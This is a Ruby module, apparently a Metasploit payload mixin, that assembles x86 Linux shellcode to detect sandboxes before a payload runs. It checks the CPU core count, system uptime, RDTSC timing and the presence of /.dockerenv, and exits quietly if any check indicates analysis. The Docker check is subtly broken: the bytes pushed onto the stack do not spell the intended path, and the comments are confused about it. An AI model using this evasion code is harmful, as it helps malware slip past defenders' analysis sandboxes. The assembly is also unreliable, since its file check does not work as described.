module Msf::Payload::Linux::X86::SandboxEvasion
  def sandbox_evasion(cores = 2, uptime = 600, check_docker = true, check_virt = false)

    rdtsc_asm = ""
    if check_virt
      rdtsc_asm = %Q^
; ─────────────────────────────────────────────────────────────
; Check: Execution Latency via RDTSC
; ─────────────────────────────────────────────────────────────
check_rdtsc:
    xor eax, eax
    cpuid
    rdtsc
    mov ebx, eax      ; Save low 32 bits of timestamp

    xor eax, eax
    cpuid

    rdtsc
    sub eax, ebx      ; Calculate delta
    
    xor ecx, ecx
    mov cx, 0x3E8      ; 1000 cycles
    cmp eax, ecx
    jge sandbox_detected   ; EXIT IF CYCLES >= 1000
      ^
    end

    docker_asm = ""
    if check_docker
      docker_asm = %Q^
; ─────────────────────────────────────────────────────────────
; Check: Container Detection via /.dockerenv existence
; ─────────────────────────────────────────────────────────────
check_docker:
    ; Push "/.dockerenv\0" to stack (Little Endian)
    ; 2f 2e 64 6f | 63 6b 65 72 | 65 6e 76 00
    xor eax, eax
    push eax              ; Null terminator
    push 0x6e766572       ; "revn"
    push 0x6b636f64       ; "dock"
    push 0x6f642e2f       ; ".d/" (Correction for /.dockerenv)
    
    ; sys_open (x86 syscall 5)
    mov eax, 5
    mov ebx, esp          ; Pointer to filename
    xor ecx, ecx          ; O_RDONLY = 0
    int 0x80

    test eax, eax
    js clean_docker       ; If return is negative (error), it's not a docker env
    jmp sandbox_detected  ; If file opened successfully, sandbox detected

clean_docker:
    add esp, 16           ; Clean up string from stack
      ^
    end

    asm = %Q^
_start:
    ; Save callee-saved registers per x86 convention
    push ebx
    push esi
    push edi
    push ebp

    ; Allocate space on stack for structures
    sub esp, 128

; ─────────────────────────────────────────────────────────────
; Check: CPU cores via sched_getaffinity (x86 syscall 103)
; ─────────────────────────────────────────────────────────────
check_cores:
    mov eax, 103          ; sys_sched_getaffinity
    xor ebx, ebx          ; pid = 0 (current process)
    mov ecx, esp          ; mask pointer
    mov edx, 128          ; size of mask
    int 0x80
    
    test eax, eax
    js check_uptime
    
    mov ebx, [esp]        ; Load mask
    xor ecx, ecx          ; Core counter
count_loop:
    test ebx, ebx
    jz evaluate_cores
    mov eax, ebx
    dec eax
    and ebx, eax
    inc ecx
    jmp count_loop

evaluate_cores:
    cmp ecx, #{cores}
    jl sandbox_detected

; ─────────────────────────────────────────────────────────────
; Check: System Uptime via sysinfo (x86 syscall 49)
; ─────────────────────────────────────────────────────────────
check_uptime:
    mov eax, 49           ; sys_sysinfo
    mov ebx, esp          ; info pointer
    int 0x80
    
    test eax, eax
    js execute_optional_checks
    
    ; In sysinfo struct, uptime is usually at offset 0 (long)
    mov eax, [esp]
    xor ebx, ebx
    mov bx, #{uptime}
    cmp eax, ebx
    jle sandbox_detected

execute_optional_checks:
#{rdtsc_asm}
#{docker_asm}

    jmp pass               ; ALL CHECKS PASSED, JUMP TO PAYLOAD

; ─────────────────────────────────────────────────────────────
; Sandbox Detected: Kill Process (x86 syscall 1)
; ─────────────────────────────────────────────────────────────
sandbox_detected:
    xor eax, eax
    mov al, 1             ; sys_exit
    xor ebx, ebx          ; status 0
    int 0x80

; ─────────────────────────────────────────────────────────────
; Clean Up & Execute
; ─────────────────────────────────────────────────────────────
pass:
    add esp, 128           ; Restore stack pointer
    xor eax, eax
    xor ecx, ecx
    xor edx, edx

    ; Restore callee-saved registers
    pop ebp
    pop edi
    pop esi
    pop ebx
^
    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
  end
end
